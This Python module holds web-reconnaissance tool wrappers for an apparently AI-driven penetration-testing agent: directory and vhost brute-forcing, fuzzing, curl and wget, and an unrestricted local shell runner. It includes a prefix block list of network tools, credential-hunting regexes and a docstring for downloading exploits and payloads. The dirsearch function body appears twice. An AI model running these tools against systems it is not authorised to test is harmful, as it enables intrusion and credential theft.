"""
Web security and advanced web vulnerability tools.

Basic:    gobuster, dirsearch, curl, wget, arjun, gau, gospider
Advanced: CORS, host header injection, GraphQL, JWT confusion,
          prototype pollution, second-order SQLi, path confusion,
          cache poisoning, cache deception, cache normalisation
"""

from __future__ import annotations

import json
import logging
import re
import subprocess
import sys
import shutil
import time
import urllib.parse
from pathlib import Path
from typing import Optional

import requests

from src.sdk.tool import function_tool
from src.sdk.utils import smart_output

logger = logging.getLogger(__name__)


@function_tool()
def gobuster_scan(url: str, wordlist: str = "", extensions: str = "") -> str:
    """
    Run directory enumeration on a web target using gobuster.

    Prefer feroxbuster_scan when available — it is recursive and faster.
    Use gobuster_scan only when feroxbuster is unavailable or for quick targeted scans.

    Args:
        url: Target URL (e.g., http://target.com)
        wordlist: Path to wordlist file (auto-detected if empty, uses medium SecLists list)
        extensions: File extensions to search (default: php,html,txt,bak,json,xml)

    Returns:
        Discovered directories and files
    """
    import os

    # Resolve wordlist: prefer larger medium lists, fall back to common.txt
    _WORDLIST_CANDIDATES = [
        wordlist,
        # SecLists medium — ~175k entries, best balance of speed vs coverage
        "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt",
        "/usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt",
        "/opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt",
        # Raft medium — SecLists alternative
        "/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
        "/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt",
        # Fallback: dirbuster medium (~220k)
        "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
        # Last resort: common.txt (only ~4600 entries)
        "/usr/share/wordlists/dirb/common.txt",
        "/usr/share/seclists/Discovery/Web-Content/common.txt",
    ]
    resolved_wordlist = None
    for candidate in _WORDLIST_CANDIDATES:
        if candidate and os.path.isfile(candidate):
            resolved_wordlist = candidate
            break

    if not resolved_wordlist and wordlist:
        return (
            f"Error: Specified wordlist '{wordlist}' not found.\n"
            "Available wordlists on this system:\n"
            "  ls /usr/share/wordlists/\n"
            "Install more: sudo apt-get install -y seclists wordlists"
        )
    if not resolved_wordlist:
        return (
            "Error: No wordlist found. Install SecLists:\n"
            "  sudo apt-get install -y seclists\n"
            "Common paths tried:\n  " +
            "\n  ".join(c for c in _WORDLIST_CANDIDATES[1:] if c)
        )

    # Default extensions: covers most server-side langs and common backup files
    effective_ext = extensions.strip() or "php,html,txt,bak,json,xml"

    # Normalise protocol: if target redirects HTTP→HTTPS, use HTTPS directly
    if url.startswith("http://"):
        try:
            resp = requests.head(url, timeout=10, allow_redirects=False, verify=False)
            location = resp.headers.get("Location", "")
            if resp.status_code in (301, 302, 307, 308) and location.startswith("https://"):
                url = location.rstrip("/")
        except Exception:
            pass

    def _run_gobuster(cmd):
        logger.info(f"[gobuster] Running: {' '.join(cmd)}")
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
        out = ((r.stdout or "") + (r.stderr or "")).strip()
        return out, r.returncode

    try:
        cmd = [
            "gobuster", "dir",
            "-u", url,
            "-w", resolved_wordlist,
            "-x", effective_ext,
            "-q",                    # quiet: no progress bar
            "-t", "30",             # more threads for medium wordlist
            "--no-error",           # suppress connection error lines
            # NOTE: no -r (redirect follow) — 302 responses are interesting findings
        ]

        output, rc = _run_gobuster(cmd)

        # Handle wildcard / soft-404 detection
        if ("provide the --wildcard" in output.lower()
            or "wildcard response found" in output.lower()
            or ("wildcard" in output.lower() and rc != 0)):
            cmd.append("--wildcard")
            output, rc = _run_gobuster(cmd)

        if not output:
            return f"No results found for {url} (wordlist: {resolved_wordlist})"

        wl_note = ""
        if "common.txt" in resolved_wordlist:
            wl_note = "\n⚠️  Using small fallback wordlist (common.txt). Install SecLists for better coverage."

        raw = output + wl_note
        return smart_output(raw, "gobuster_scan", url)
    except subprocess.TimeoutExpired:
        return "Error: Gobuster scan timed out after 10 minutes"
    except FileNotFoundError:
        return "Error: gobuster not found. Install: sudo apt-get install gobuster"
    except Exception as e:
        return f"Error running gobuster: {str(e)}"


@function_tool()
def vhost_bruteforce(target: str, base_domain: str, wordlist: str = "", tool: str = "ffuf") -> str:
    """
    Enumerate hidden virtual hosts against an IP or canonical host.

    Args:
        target: Base URL or raw host/IP that serves the target
        base_domain: Root domain to fuzz (e.g. example.com, htb.local)
        wordlist: Optional custom wordlist path
        tool: ffuf or gobuster

    Returns:
        Discovered virtual hosts and the exact command used
    """
    import os

    resolved_wordlist = None
    candidates = [
        wordlist,
        "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
        "/usr/share/seclists/Discovery/DNS/namelist.txt",
        "/usr/share/seclists/Discovery/Web-Content/common.txt",
    ]
    for candidate in candidates:
        if candidate and os.path.isfile(candidate):
            resolved_wordlist = candidate
            break
    if not resolved_wordlist:
        return "Error: No vhost wordlist found. Install SecLists or provide a custom wordlist."

    parsed = urllib.parse.urlparse(target if "://" in target else f"http://{target}")
    scheme = parsed.scheme or "http"
    host = parsed.netloc or parsed.path
    base_url = f"{scheme}://{host}"
    host_header = f"FUZZ.{base_domain}"

    try:
        if tool.lower() == "gobuster":
            cmd = [
                "gobuster", "vhost",
                "-u", base_url,
                "-w", resolved_wordlist,
                "-t", "30",
                "--append-domain",
                "-q",
            ]
            output = subprocess.run(cmd, capture_output=True, text=True, timeout=900)
            text = ((output.stdout or "") + (output.stderr or "")).strip()
        else:
            cmd = [
                "ffuf",
                "-u", base_url,
                "-H", f"Host: {host_header}",
                "-w", resolved_wordlist,
                "-fs", "0",
                "-mc", "200,204,301,302,307,401,403",
            ]
            output = subprocess.run(cmd, capture_output=True, text=True, timeout=900)
            text = ((output.stdout or "") + (output.stderr or "")).strip()

        findings = []
        for line in text.splitlines():
            if base_domain in line and "FUZZ" not in line:
                findings.append(line.strip())

        summary = (
            f"## Virtual Host Enumeration\n\n"
            f"Target: {base_url}\n"
            f"Base domain: {base_domain}\n"
            f"Tool: {tool}\n"
            f"Command: {' '.join(cmd)}\n\n"
        )
        if findings:
            summary += "Discovered candidates:\n" + "\n".join(f"- {line}" for line in findings[:50])
        else:
            summary += "No vhosts discovered in tool output."
        summary += f"\n\nRaw output:\n{text[:12000]}"
        return summary
    except FileNotFoundError:
        return f"Error: {tool} not found. Install ffuf or gobuster."
    except subprocess.TimeoutExpired:
        return f"Error: {tool} vhost enumeration timed out after 15 minutes."
    except Exception as e:
        return f"Error: {e}"


@function_tool()
def wfuzz_fuzz(url: str, wordlist: str = "", payload_marker: str = "FUZZ", options: str = "") -> str:
    """
    Run WFuzz for parameter, path, or header fuzzing.

    Args:
        url: Target URL containing FUZZ marker
        wordlist: Wordlist path (auto-detected if empty)
        payload_marker: Marker token inside the URL/body/header string
        options: Additional wfuzz flags

    Returns:
        WFuzz findings and raw output
    """
    import os

    resolved_wordlist = None
    candidates = [
        wordlist,
        "/usr/share/seclists/Discovery/Web-Content/common.txt",
        "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt",
    ]
    for candidate in candidates:
        if candidate and os.path.isfile(candidate):
            resolved_wordlist = candidate
            break
    if not resolved_wordlist:
        return "Error: No WFuzz wordlist found. Install SecLists or provide a wordlist path."
    if payload_marker not in url and "FUZZ" not in url:
        return "Error: URL must contain a fuzz marker such as FUZZ."

    fuzz_url = url.replace(payload_marker, "FUZZ")
    cmd = ["wfuzz", "-c", "-z", f"file,{resolved_wordlist}", fuzz_url] + options.split()
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=900)
        text = ((result.stdout or "") + (result.stderr or "")).strip()
        return (
            f"## WFuzz Results\n\n"
            f"Command: {' '.join(cmd)}\n\n"
            f"{text[:12000]}"
        )
    except FileNotFoundError:
        return "Error: wfuzz not found. Install: pip install wfuzz"
    except subprocess.TimeoutExpired:
        return "Error: WFuzz timed out after 15 minutes."
    except Exception as e:
        return f"Error: {e}"


@function_tool()
def dirsearch_scan(url: str, extensions: str = "php,html,js,txt,bak", wordlist: str = "", threads: int = 20) -> str:
    """
    Run directory enumeration using dirsearch (more comprehensive than gobuster).
    
    Args:
        url: Target URL (e.g., http://target.com)
        extensions: File extensions to search (comma-separated)
        wordlist: Custom wordlist path (optional, uses default if empty)
        threads: Number of threads (default: 20)
    
    Returns:
        Discovered directories and files with status codes
    """
    import os

    def _build_args(url, extensions, threads, wordlist):
        args = ["-u", url, "-e", extensions, "-t", str(threads),
                "--no-color"]          # avoid ANSI codes that clutter subprocess output
        # --follow-redirects was added in newer dirsearch versions; skip it to stay compatible
        if wordlist:
            args.extend(["-w", wordlist])
        return args

    def _try_run(cmd, label, timeout=900):
        """Execute cmd and return (stdout+stderr, returncode). Logs diagnostics."""
        logger.info(f"[dirsearch:{label}] Running: {' '.join(cmd)}")
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        out = ((r.stdout or "") + (r.stderr or "")).strip()
        logger.info(f"[dirsearch:{label}] Exit code: {r.returncode}, output length: {len(out)}")
        if len(out) < 500:
            logger.info(f"[dirsearch:{label}] Full output: {out}")
        else:
            logger.info(f"[dirsearch:{label}] First 500 chars: {out[:500]}")
        return out, r.returncode

    def _has_scan_results(output: str) -> bool:
        """Return True if output contains actual scan results (not just banner/warnings)."""
        # Look for HTTP status codes in output (e.g., "200 -  1234B  - /path")
        import re
        if re.search(r'\b(200|201|301|302|403|500)\b.*[-/]', output):
            return True
        # Check for dirsearch result lines: "[HH:MM:SS] 200 - 1234B - /path"
        if re.search(r'\[\d{2}:\d{2}:\d{2}\]\s+\d{3}\s', output):
            return True
        # Check for "Total requests:" indicating a completed scan
        if "Total requests:" in output or "completed" in output.lower():
            return True
        return False

    base_args = _build_args(url, extensions, threads, wordlist)

    # ── Strategy 0: python -m dirsearch (venv Python — most reliable) ────────
    # Run this FIRST because the dirsearch package is installed in the active venv.
    # The system binary often uses a different Python that is missing dependencies.
    try:
        output, rc = _try_run([sys.executable, "-m", "dirsearch"] + base_args, "strategy0_module")
        if output and "No module named" not in output and "ImportError" not in output:
            return smart_output(output, "dirsearch_scan", url)
    except subprocess.TimeoutExpired:
        return "Error: Dirsearch scan timed out after 15 minutes"
    except Exception as e:
        logger.warning(f"[dirsearch:strategy0] Exception: {e}")

    # ── Strategy 1: call the dirsearch binary directly ──
    dirsearch_bin = shutil.which("dirsearch")
    logger.info(f"[dirsearch] Binary location: {dirsearch_bin}")
    if dirsearch_bin:
        try:
            output, rc = _try_run([dirsearch_bin] + base_args, "strategy1")
            # Only fall through on hard import errors with non-zero exit
            if rc != 0 and ("ModuleNotFoundError" in output or "ImportError" in output):
                logger.warning("[dirsearch:strategy1] Import error, falling through")
            elif _has_scan_results(output):
                return smart_output(output, "dirsearch_scan", url)
            elif rc == 0 and output and len(output) > 100:
                return output
            else:
                logger.warning(f"[dirsearch:strategy1] No scan results detected (rc={rc}, len={len(output)})")
        except FileNotFoundError:
            logger.warning("[dirsearch:strategy1] Shebang interpreter missing")
        except subprocess.TimeoutExpired:
            return "Error: Dirsearch scan timed out after 15 minutes"
        except Exception as e:
            logger.warning(f"[dirsearch:strategy1] Exception: {e}")

    # ── Strategy 2: run the dirsearch script with the current Python interpreter ──
    # This handles the case where dirsearch's shebang points to system Python
    # while the module is only accessible from the venv (or vice versa).
    dirsearch_script = dirsearch_bin or shutil.which("dirsearch")
    # Also try the well-known system path
    _DIRSEARCH_PATHS = [
        dirsearch_script,
        "/usr/bin/dirsearch",
        "/usr/local/bin/dirsearch",
        "/usr/lib/python3/dist-packages/dirsearch/dirsearch.py",
    ]
    for script_path in _DIRSEARCH_PATHS:
        if script_path and os.path.isfile(script_path):
            try:
                # Avoid passing shell scripts to sys.executable (prevents SyntaxError)
                with open(script_path, "r", encoding="utf-8", errors="ignore") as f:
                    if "exec python" in f.read(100) or script_path.endswith(".sh"):
                        continue
                        
                output, rc = _try_run(
                    [sys.executable, script_path] + base_args,
                    f"strategy2:{os.path.basename(script_path)}"
                )
                if _has_scan_results(output):
                    return smart_output(output, "dirsearch_scan", url)
                if rc == 0 and output and len(output) > 100 and "No module named" not in output:
                    return smart_output(output, "dirsearch_scan", url)
            except subprocess.TimeoutExpired:
                return "Error: Dirsearch scan timed out after 15 minutes"
            except Exception as e:
                logger.warning(f"[dirsearch:strategy2] {script_path} failed: {e}")

    # ── Strategy 3: python -m dirsearch (pip-installed as a package) ──
    try:
        output, rc = _try_run([sys.executable, "-m", "dirsearch"] + base_args, "strategy3")
        if output and "No module named" not in output:
            return smart_output(output, "dirsearch_scan", url)
    except subprocess.TimeoutExpired:
        return "Error: Dirsearch scan timed out after 15 minutes"
    except Exception as e:
        logger.warning(f"[dirsearch:strategy3] Exception: {e}")
    """
    Run directory enumeration using dirsearch (more comprehensive than gobuster).
    
    Args:
        url: Target URL (e.g., http://target.com)
        extensions: File extensions to search (comma-separated)
        wordlist: Custom wordlist path (optional, uses default if empty)
        threads: Number of threads (default: 20)
    
    Returns:
        Discovered directories and files with status codes
    """
    import os

    def _build_args(url, extensions, threads, wordlist):
        args = ["-u", url, "-e", extensions, "-t", str(threads),
                "--no-color"]          # avoid ANSI codes that clutter subprocess output
        # --follow-redirects was added in newer dirsearch versions; skip it to stay compatible
        if wordlist:
            args.extend(["-w", wordlist])
        return args

    def _try_run(cmd, label, timeout=900):
        """Execute cmd and return (stdout+stderr, returncode). Logs diagnostics."""
        logger.info(f"[dirsearch:{label}] Running: {' '.join(cmd)}")
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        out = ((r.stdout or "") + (r.stderr or "")).strip()
        logger.info(f"[dirsearch:{label}] Exit code: {r.returncode}, output length: {len(out)}")
        if len(out) < 500:
            logger.info(f"[dirsearch:{label}] Full output: {out}")
        else:
            logger.info(f"[dirsearch:{label}] First 500 chars: {out[:500]}")
        return out, r.returncode

    def _has_scan_results(output: str) -> bool:
        """Return True if output contains actual scan results (not just banner/warnings)."""
        # Look for HTTP status codes in output (e.g., "200 -  1234B  - /path")
        import re
        if re.search(r'\b(200|201|301|302|403|500)\b.*[-/]', output):
            return True
        # Check for dirsearch result lines: "[HH:MM:SS] 200 - 1234B - /path"
        if re.search(r'\[\d{2}:\d{2}:\d{2}\]\s+\d{3}\s', output):
            return True
        # Check for "Total requests:" indicating a completed scan
        if "Total requests:" in output or "completed" in output.lower():
            return True
        return False

    base_args = _build_args(url, extensions, threads, wordlist)

    # ── Strategy 0: python -m dirsearch (venv Python — most reliable) ────────
    # Run this FIRST because the dirsearch package is installed in the active venv.
    # The system binary often uses a different Python that is missing dependencies.
    try:
        output, rc = _try_run([sys.executable, "-m", "dirsearch"] + base_args, "strategy0_module")
        if output and "No module named" not in output and "ImportError" not in output:
            return smart_output(output, "dirsearch_scan", url)
    except subprocess.TimeoutExpired:
        return "Error: Dirsearch scan timed out after 15 minutes"
    except Exception as e:
        logger.warning(f"[dirsearch:strategy0] Exception: {e}")

    # ── Strategy 1: call the dirsearch binary directly ──
    dirsearch_bin = shutil.which("dirsearch")
    logger.info(f"[dirsearch] Binary location: {dirsearch_bin}")
    if dirsearch_bin:
        try:
            output, rc = _try_run([dirsearch_bin] + base_args, "strategy1")
            # Only fall through on hard import errors with non-zero exit
            if rc != 0 and ("ModuleNotFoundError" in output or "ImportError" in output):
                logger.warning("[dirsearch:strategy1] Import error, falling through")
            elif _has_scan_results(output):
                return smart_output(output, "dirsearch_scan", url)
            elif rc == 0 and output and len(output) > 100:
                return output
            else:
                logger.warning(f"[dirsearch:strategy1] No scan results detected (rc={rc}, len={len(output)})")
        except FileNotFoundError:
            logger.warning("[dirsearch:strategy1] Shebang interpreter missing")
        except subprocess.TimeoutExpired:
            return "Error: Dirsearch scan timed out after 15 minutes"
        except Exception as e:
            logger.warning(f"[dirsearch:strategy1] Exception: {e}")

    # ── Strategy 2: run the dirsearch script with the current Python interpreter ──
    # This handles the case where dirsearch's shebang points to system Python
    # while the module is only accessible from the venv (or vice versa).
    dirsearch_script = dirsearch_bin or shutil.which("dirsearch")
    # Also try the well-known system path
    _DIRSEARCH_PATHS = [
        dirsearch_script,
        "/usr/bin/dirsearch",
        "/usr/local/bin/dirsearch",
        "/usr/lib/python3/dist-packages/dirsearch/dirsearch.py",
    ]
    for script_path in _DIRSEARCH_PATHS:
        if script_path and os.path.isfile(script_path):
            try:
                # Avoid passing shell scripts to sys.executable (prevents SyntaxError)
                with open(script_path, "r", encoding="utf-8", errors="ignore") as f:
                    if "exec python" in f.read(100) or script_path.endswith(".sh"):
                        continue
                        
                output, rc = _try_run(
                    [sys.executable, script_path] + base_args,
                    f"strategy2:{os.path.basename(script_path)}"
                )
                if _has_scan_results(output):
                    return smart_output(output, "dirsearch_scan", url)
                if rc == 0 and output and len(output) > 100 and "No module named" not in output:
                    return smart_output(output, "dirsearch_scan", url)
            except subprocess.TimeoutExpired:
                return "Error: Dirsearch scan timed out after 15 minutes"
            except Exception as e:
                logger.warning(f"[dirsearch:strategy2] {script_path} failed: {e}")

    # ── Strategy 3: python -m dirsearch (pip-installed as a package) ──
    try:
        output, rc = _try_run([sys.executable, "-m", "dirsearch"] + base_args, "strategy3")
        if output and "No module named" not in output:
            return smart_output(output, "dirsearch_scan", url)
    except subprocess.TimeoutExpired:
        return "Error: Dirsearch scan timed out after 15 minutes"
    except Exception as e:
        logger.warning(f"[dirsearch:strategy3] Exception: {e}")

    # All strategies exhausted - return diagnostic information
    diag = (
        "Error: dirsearch failed to produce results.\n"
        f"Binary found: {dirsearch_bin}\n"
        f"Python: {sys.executable}\n"
    )
    if dirsearch_bin:
        diag += (
            "Fix: pip install --upgrade dirsearch setuptools\n"
            "Or reinstall: pip uninstall dirsearch -y && pip install dirsearch"
        )
    else:
        diag += (
            "Install with:\n"
            "  pip install dirsearch\n"
            "  Or: sudo apt-get install dirsearch"
        )
    return diag


@function_tool()
def run_local_command(command: str, timeout: int = 30, working_dir: str = "") -> str:
    """
    Execute a shell command on local files — grep, awk, strings, sort, uniq, wc, cat, etc.
    ONLY for processing files already on disk. Never use for network operations (curl/wget/nc).
    Use this after wget_download to process downloaded files (grep endpoints, extract tokens, etc.).

    Examples:
        run_local_command("grep -oE 'https?://[^\"]+' /path/to/file.js | sort -u")
        run_local_command("strings /path/to/binary | grep -i 'password'")
        run_local_command("cat /path/to/file.txt | grep -i 'api_key'")

    Args:
        command: Shell command to execute (bash -c). Avoid network tools.
        timeout: Max seconds to wait (default: 30)
        working_dir: Optional working directory (defaults to current directory)

    Returns:
        Command stdout/stderr, or an error message
    """
    # Safety: block network tools
    _BLOCKED = ["curl ", "wget ", "nc ", "ncat ", "netcat ", "nmap ", "hydra ", "ssh ", "ftp "]
    _cmd_lower = command.lower().lstrip()
    for blocked in _BLOCKED:
        if _cmd_lower.startswith(blocked.strip()):
            return (
                f"\u274c BLOCKED: run_local_command does not allow network tools ('{blocked.strip()}').\n"
                f"Use curl_request(), wget_download(), or nmap_* tools for network operations."
            )
    try:
        cwd = working_dir if working_dir else None
        result = subprocess.run(
            command, shell=True, capture_output=True, text=True, timeout=timeout, cwd=cwd
        )
        stdout = result.stdout or ""
        stderr = result.stderr or ""
        output = (stdout + stderr).strip()
        if not output:
            return f"Command completed with no output (exit code: {result.returncode})"
        if len(output) > 8000:
            output = output[:8000] + f"\n... [{len(output) - 8000} more bytes truncated]"
        return f"Exit code: {result.returncode}\n{output}"
    except subprocess.TimeoutExpired:
        return f"Error: Command timed out after {timeout} seconds"
    except Exception as e:
        return f"Error running command: {str(e)}"


@function_tool()
def curl_request(url: str, method: str = "GET", headers: str = "", data: str = "",
                 follow_redirects: bool = True, show_headers: bool = False, session_name: str = "", options: str = "") -> str:
    """
    Make HTTP requests using curl. Returns a structured summary of the response
    (title, forms, links, interesting strings) followed by a truncated body.
    Much more useful than raw HTML for agent decision-making.

    ⚠️ SPA DETECTION: If the response body contains only a script-module loader and an empty
    root div (e.g. React/Vue/Svelte apps), curl cannot render the page. In that case, switch
    to browser_visit(url, wait_strategy="networkidle", wait_time=10) instead.

    Args:
        url: Target URL
        method: HTTP method (GET, POST, PUT, DELETE, etc.)
        headers: Custom headers in format "Header1: Value1, Header2: Value2"
        data: POST/PUT data
        follow_redirects: Follow HTTP redirects (default: True)
        show_headers: Include response headers in output (default: False)
        session_name: Active authentication session name to automatically inject cookies.
        options: Additional raw curl options (e.g., "--include --insecure").

    Returns:
        Structured response summary + truncated body
    """
    if session_name:
        from src.tools.auth_context import _SESSION_STORE
        sess = _SESSION_STORE.get(session_name)
        if not sess:
            return f"⛔ ERROR: Authentication session '{session_name}' not found."
            
        req_kwargs = sess.as_requests_kwargs()
        
        # Inject cookies as Cookie header
        if req_kwargs.get("cookies"):
            sess_cookies = "; ".join(f"{k}={v}" for k, v in req_kwargs["cookies"].items())
            cookie_hdr = f"Cookie: {sess_cookies}"
            headers = f"{headers}, {cookie_hdr}" if headers else cookie_hdr
            
        # Inject token as Authorization header
        if req_kwargs.get("headers"):
            for hk, hv in req_kwargs["headers"].items():
                if hk.lower() == "authorization":
                    token_hdr = f"{hk}: {hv}"
                    headers = f"{headers}, {token_hdr}" if headers else token_hdr

    # ── Protocol guard: reject non-HTTP ports before curl even runs ───────────
    _NON_HTTP_PORTS_CR = {
        21: "FTP", 22: "SSH", 23: "Telnet",
        25: "SMTP", 110: "POP3", 143: "IMAP",
        161: "SNMP", 389: "LDAP", 445: "SMB",
        465: "SMTPS/SMTP", 587: "SMTP Submission",
        636: "LDAPS", 993: "IMAPS", 995: "POP3S",
        3306: "MySQL", 5432: "PostgreSQL", 5900: "VNC",
        6379: "Redis", 27017: "MongoDB",
    }
    try:
        import urllib.parse as _ulp_cr
        _url_cr = url if "://" in url else f"http://{url}"
        _parsed_cr = _ulp_cr.urlparse(_url_cr)
        _port_cr = _parsed_cr.port
        _svc_cr = _NON_HTTP_PORTS_CR.get(_port_cr, "") if _port_cr is not None else ""
        if _svc_cr:
            _tips_cr = {
                25:  f"  Raw socket:  nc -C {_parsed_cr.hostname} 25  (speak SMTP)",
                587: (
                    f"  swaks: swaks --to user@domain --server {_parsed_cr.hostname}:587 --tls\n"
                    f"  Python: python3 -c \"import smtplib; s=smtplib.SMTP('{_parsed_cr.hostname}', 587); "
                    f"s.ehlo(); s.starttls(); print(s.ehlo())\""
                ),
                21:  "  ftp <target>  or  nmap_service_scan for FTP enumeration",
                22:  "  ssh_exec() or netcat_shell() for SSH interaction",
                110: f"  Raw socket:  nc {_parsed_cr.hostname} 110  (speak POP3)",
                143: f"  Raw socket:  nc {_parsed_cr.hostname} 143  (speak IMAP)",
            }
            _port_num = _port_cr if _port_cr is not None else 0
            _tip_cr = _tips_cr.get(_port_num, f"  Use a protocol-specific tool for {_svc_cr} on port {_port_num}")
            return (
                f"\u26d4 PROTOCOL MISMATCH: curl_request cannot communicate with a "
                f"{_svc_cr} service on port {_port_cr}.\n"
                f"URL passed: {url}\n\n"
                f"Correct approach:\n{_tip_cr}"
            )
    except Exception:
        pass  # guard is non-fatal
    try:
        cmd = ["curl", "-s", "-X", method]

        if follow_redirects:
            cmd.append("-L")
        if show_headers:
            cmd.append("-i")
        if options:
            import shlex
            cmd.extend(shlex.split(options))

        cmd.extend(["--max-time", "30"])

        # Virtual host awareness
        _has_host_hdr = any("host:" in h.lower() for h in headers.split(",")) if headers else False
        if not _has_host_hdr:
            try:
                from src.tools.http_proxy import resolve_vhost as _rv
                url, _vhost = _rv(url)
                if _vhost:
                    cmd.extend(["-H", f"Host: {_vhost}"])
            except Exception:
                pass

        if headers:
            for header in headers.split(","):
                header = header.strip()
                if header:
                    cmd.extend(["-H", header])

        if data:
            cmd.extend(["-d", data])

        cmd.append(url)

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        body = result.stdout or ""

        if result.stderr and "curl:" in result.stderr:
            return f"Error: {result.stderr}\n{body[:2000]}"

        if not body.strip():
            return "No response received"

        # ── Structured summary ─────────────────────────────────────────────────
        summary_lines = []

        # Title
        title_m = re.search(r'<title[^>]*>([^<]{1,200})</title>', body, re.IGNORECASE)
        if title_m:
            summary_lines.append(f"Title: {title_m.group(1).strip()}")

        # Forms — show action + method + input names
        forms = re.findall(
            r'<form[^>]*action=["\']?([^"\'\s>]*)["\']?[^>]*method=["\']?([^"\'>\s]*)',
            body, re.IGNORECASE
        )
        form_inputs = re.findall(r'<input[^>]+name=["\']([^"\']+)["\']', body, re.IGNORECASE)
        if forms:
            summary_lines.append(f"Forms ({len(forms)}):")
            for action, method_f in forms[:5]:
                summary_lines.append(f"  [{method_f.upper() or 'GET'}] {action or '(current)'}")
        if form_inputs:
            summary_lines.append(f"  Input fields: {', '.join(dict.fromkeys(form_inputs[:15]))}")

        # Interesting links
        links = re.findall(r'href=["\']([^"\'#][^"\']*)["\'\s]', body, re.IGNORECASE)
        interesting_links = [
            l for l in links
            if any(k in l.lower() for k in [
                "admin", "login", "upload", "api", "dashboard",
                "config", "backup", "export", "download", "token",
                "secret", "key", "password", "auth", "register", "signup",
            ])
        ][:10]
        if interesting_links:
            summary_lines.append(f"Interesting links ({len(interesting_links)}):")
            for lnk in interesting_links:
                summary_lines.append(f"  {lnk}")

        # Interesting strings: tokens, keys, credentials, errors
        interesting_patterns = [
            (r'(api[_-]?key|apikey|secret|token|password|passwd|pwd)["\']?\s*[:=]\s*["\']([^"\']{4,80})', 'credential'),
            (r'(error|exception|stack trace|traceback|syntax error)', 'error'),
            (r'(version|v)[>\s]+(\d+\.\d+[\.\d]*)', 'version'),
            (r'csrf[_-]?token[^>]*value=["\']([^"\']{10,})', 'csrf_token'),
        ]
        found_strings = []
        for pattern, label in interesting_patterns:
            for m in re.finditer(pattern, body, re.IGNORECASE):
                snippet = m.group(0)[:80].strip()
                found_strings.append(f"  [{label}] {snippet}")
                if len(found_strings) >= 8:
                    break
            if len(found_strings) >= 8:
                break
        if found_strings:
            summary_lines.append("Interesting strings:")
            summary_lines += found_strings

        # Redirect hint
        meta_refresh = re.search(r'<meta[^>]+http-equiv=["\']?refresh["\']?[^>]*url=([^"\'>\s]+)', body, re.IGNORECASE)
        if meta_refresh:
            summary_lines.append(f"Meta-refresh redirect: {meta_refresh.group(1)}")

        summary = "\n".join(summary_lines) if summary_lines else "(no notable elements detected)"

        # ── SPA Detection ─────────────────────────────────────────────────────
        # React/Vue/Svelte SPAs return a nearly-empty body: just a <div id="root"> or
        # <div id="app"> and a <script type="module"> loader. curl cannot execute JS,
        # so iterating more curl calls against this page is useless.
        _is_spa = False
        _body_stripped = re.sub(r'<!--.*?-->', '', body, flags=re.DOTALL).strip()
        if (
            re.search(r'<script[^>]+type=["\']module["\']', body, re.IGNORECASE)
            and re.search(r'<div[^>]+id=["\'](?:root|app|main|mount)["\']\s*/?>\s*</div>', body, re.IGNORECASE)
            and len(_body_stripped) < 3000
        ):
            _is_spa = True

        # Return summary + truncated body
        body_preview = body[:4000] + (f"\n... [{len(body) - 4000} more bytes truncated]" if len(body) > 4000 else "")
        spa_warning = (
            "\n\n\u26a0\ufe0f  SPA DETECTED: This page is a JavaScript Single-Page Application (React/Vue/Svelte).\n"
            "   curl only returns the empty HTML shell \u2014 the real content is rendered by JS in the browser.\n"
            "   ACTION REQUIRED: Switch to browser_visit(url, wait_strategy='networkidle', wait_time=10)\n"
            "   DO NOT keep calling curl_request on this URL \u2014 it will always return the same empty body."
        ) if _is_spa else ""
        return f"### Response Summary\n{summary}\n\n### Body\n{body_preview}{spa_warning}"

    except subprocess.TimeoutExpired:
        return "Error: Request timed out after 60 seconds"
    except FileNotFoundError:
        return "Error: curl not found. Please install curl."
    except Exception as e:
        return f"Error making request: {str(e)}"


@function_tool()
def wget_download(url: str, output_path: str = "", options: str = "") -> str:
    """
    Download files using wget - useful for downloading exploits, payloads, or resources.
    Files are automatically saved to the current session's downloads/ folder unless
    an explicit output_path is given. The returned path is the absolute path to use
    in follow-up tool calls (e.g. run_local_command, code_analysis).

    Args:
        url: URL to download from
        output_path: Where to save the file (leave empty to auto-save into session downloads/)
        options: Additional wget options (e.g., "--no-check-certificate -q")

    Returns:
        Download result and absolute file path
    """
    try:
        # Resolve output path — auto-direct to session downloads/ when not specified
        if not output_path:
            try:
                from src.repl.target_manager import get_target_manager
                dl_dir = get_target_manager().get_session_downloads_dir()
                if dl_dir:
                    filename = url.split("?")[0].rstrip("/").split("/")[-1] or "downloaded_file"
                    output_path = str(dl_dir / filename)
            except Exception:
                pass  # fall through — wget will save to cwd

        # ── Deduplication: skip re-download if file already exists with content ──
        if output_path:
            existing = Path(output_path)
            if existing.exists() and existing.stat().st_size > 0:
                abs_path = str(existing.absolute())
                return (
                    f"[SKIPPED] File already exists at: {abs_path}\n"
                    f"Size: {existing.stat().st_size:,} bytes\n"
                    f"Use this exact path in follow-up tool calls (run_local_command, code_analysis, etc.)\n"
                    f"To force re-download, delete the file first or specify a different output_path."
                )

        # Ensure parent directory exists before wget writes to it
        if output_path:
            Path(output_path).parent.mkdir(parents=True, exist_ok=True)

        cmd = ["wget"]
        if options:
            cmd.extend(options.split())
        if output_path:
            cmd.extend(["-O", output_path])
        cmd.append(url)

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)

        if result.returncode == 0:
            abs_path = str(Path(output_path).absolute()) if output_path else url.split("/")[-1]
            return (
                f"Downloaded successfully.\n"
                f"File saved to: {abs_path}\n"
                f"Use this exact path in follow-up tool calls (run_local_command, code_analysis, etc.)\n"
                f"{result.stderr}"
            )
        else:
            return f"Download failed: {result.stderr}"
    except subprocess.TimeoutExpired:
        return "Error: Download timed out after 2 minutes"
    except FileNotFoundError:
        return "Error: wget not found. Please install wget."
    except Exception as e:
        return f"Error downloading: {str(e)}"


def save_file_to_session(filename: str, content: str, subfolder: str = "files") -> str:
    """
